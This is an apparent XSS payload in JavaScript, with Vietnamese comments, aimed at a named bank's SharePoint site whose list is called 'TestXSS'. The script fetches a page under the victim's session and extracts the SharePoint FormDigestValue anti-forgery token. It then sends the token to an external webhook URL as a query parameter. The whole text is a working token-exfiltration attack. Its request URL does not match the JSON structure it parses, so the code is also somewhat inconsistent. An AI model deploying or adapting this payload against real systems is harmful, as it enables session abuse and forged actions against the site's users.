// Thay thế bằng URL API GET thực tế mà bạn gọi để lấy FormDigestValue
const DIGEST_API_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/Lists/TestXSS/AllItems.aspx'; // API GET thường có tham số
// Thay thế bằng URL Webhook của bạn
const WEBHOOK_URL = 'https://webhook-test.com/fc090c2a4b9b8347c2761f9e3944e4bc'; 

function sendToWebhook(digestValue) {
    const webhookReq = new XMLHttpRequest();
    
    // Gửi giá trị qua tham số query trong request GET đơn giản
    const finalWebhookUrl = WEBHOOK_URL + '?digest=' + encodeURIComponent(digestValue);
    
    // Sử dụng GET để đảm bảo dữ liệu được ghi lại dễ dàng
    webhookReq.open('get', finalWebhookUrl, true); 
    webhookReq.send();
    console.log("FormDigestValue đã được gửi đến webhook.");
}

function handleResponse() {
    let digestValue = null;
    
    try {
        // 1. Phân tích JSON từ phản hồi
        const responseJson = JSON.parse(this.responseText);
        
        // 2. Trích xuất giá trị: Điều chỉnh đường dẫn này nếu cần
        // (Đây là đường dẫn phổ biến trong các API của Microsoft SharePoint)
        digestValue = responseJson.d.GetContextWebInformation.FormDigestValue;

    } catch (e) {
        console.error("Lỗi khi xử lý Response (Không phải JSON hoặc cấu trúc sai):", e);
        return; 
    }
    
    if (digestValue) {
        // 3. Gọi hàm gửi tới Webhook
        sendToWebhook(digestValue);
    } else {
        console.error("Không tìm thấy FormDigestValue hợp lệ trong Response.");
    }
}

// Bắt đầu quá trình: Gửi request lấy FormDigestValue
const digestReq = new XMLHttpRequest();
digestReq.onload = handleResponse;

// *** THAY ĐỔI TẠI ĐÂY: Sử dụng GET thay vì POST ***
digestReq.open('get', DIGEST_API_URL, true); 

// Thiết lập các header cần thiết để nhận phản hồi JSON
digestReq.setRequestHeader('Accept', 'application/json;odata=verbose');
// Không cần Content-Type cho GET request
// digestReq.setRequestHeader('Content-Type', 'application/json;odata=verbose'); 

// Đối với GET request, send() không cần body
digestReq.send();
